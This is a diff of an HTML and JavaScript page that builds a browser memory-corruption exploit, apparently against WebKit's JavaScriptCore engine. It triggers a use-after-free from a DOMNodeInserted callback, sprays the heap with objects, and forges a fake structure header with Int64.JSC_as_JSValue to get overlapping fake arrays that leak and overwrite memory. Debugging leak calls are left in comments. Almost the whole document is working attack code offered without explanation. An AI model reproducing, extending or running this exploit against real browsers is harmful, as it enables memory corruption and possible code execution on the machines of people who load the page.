@@ -1,3 +1,7 @@
+<head>
+<script src="int64.js">
+</script>
+</head>
 <body onload="start();">
 <embed id="worker" src="data:video/mp4;"></embed>
 <script>
@@ -29,11 +33,9 @@ function gc() {
 
 function start()
 {
-    document.leakState();
     var worker = document.getElementById("worker");
     window.top.document.getElementById("cur").addEventListener("DOMNodeInserted", callback0);
     var intl = setInterval(function(){
-        // worker.GetURL.a = 777;
         window.top.f();
         clearInterval(intl);
     }, 1);
@@ -48,33 +50,61 @@ var spray_obj = []
 var hold_structure;
 function callback(ev) {
     gc();
+
+    /*
+    document.leakState();
+    document.leakState_160();
+    return;
+    */
+
     for (let i = 0; i < 100; ++i)
         big_guys.push(new X([i]));
-    for (let i = 0; i < 200; ++i)
+    for (let i = 0; i < 199; ++i)
         spray_obj.push({a: 1, b: 2, c: 3, d: 4, e: 5});
     let reclaim_obj = {a: 1, b: 2, c: 3, d: 4, e: 5};
     for (let i = 0; i < 2; ++i)
         spray_obj.push({a: 1, b: 2, c: 3, d: 4, e: 5});
     let dummy = {a: 1, b: 2, c: 3, d: 4, e: 5};
-    let fake_obj = {12: "a", b: 2, c: 3, d: 4, e: 5, f: 6, g: 7};
-    reclaim_obj.a = fake_obj;
-    // document.leakAddr(reclaim_obj);
-    // document.leakAddr(fake_obj);
-    // document.leakAddr(worker.a);
+    let fake_obj_1 = {a: 1, b: 2, c: 3, d: 4, e: 5};
+    let fake_obj_2 = {a: 1, b: 2, c: 3, d: 4, e: 5};
+    reclaim_obj.a = fake_obj_1;
+    reclaim_obj.b = fake_obj_2;
+
+    /*
+    document.leakAddr(reclaim_obj);
+    document.leakAddr(fake_obj);
+    document.leakAddr(worker.a);
+    */
+
     dummy = undefined;
-    fake_obj = undefined;
+    fake_obj_1 = undefined;
+    fake_obj_2 = undefined;
     reclaim_obj = undefined;
     gc();
 
-    let fake_arr = worker.a;
+    let fake_arr_1 = worker.a;
+    let fake_arr_2 = worker.b;
     var overwrite_obj = new X([1.1, 2.2]);
-    overwrite_obj.g = 6.85681541581055e-304;
-    overwrite_obj.h = fake_arr;
+    overwrite_obj.g = Int64.JSC_as_JSValue(0x0100180800000000);
+    overwrite_obj.h = fake_arr_1;
+
+    /*
     document.leakAddr(overwrite_obj);
     document.leakAddr(worker.a);
-    document.leakAddr(fake_arr);
+    document.leakAddr(fake_arr_1);
+    document.leakAddr(worker.b);
+    document.leakAddr(fake_arr_2);
+    */
  
-    alert(fake_arr[12]);
+    var leaked_header = Int64.from_double(fake_arr_1[22]);
+    leaked_header.high = 0x01100300;
+    // alert(leaked_header);
+
+    overwrite_obj.g = Int64.JSC_as_JSValue(leaked_header);
+    overwrite_obj.h = fake_arr_2;
+    overwrite_obj.o = Int64.JSC_as_JSValue(0x0002000000000002);
+    overwrite_obj.p = overwrite_obj;
+    var leaked_data = Symbol.prototype.toString.call(fake_arr_1);
 
     while (true) {}
 }
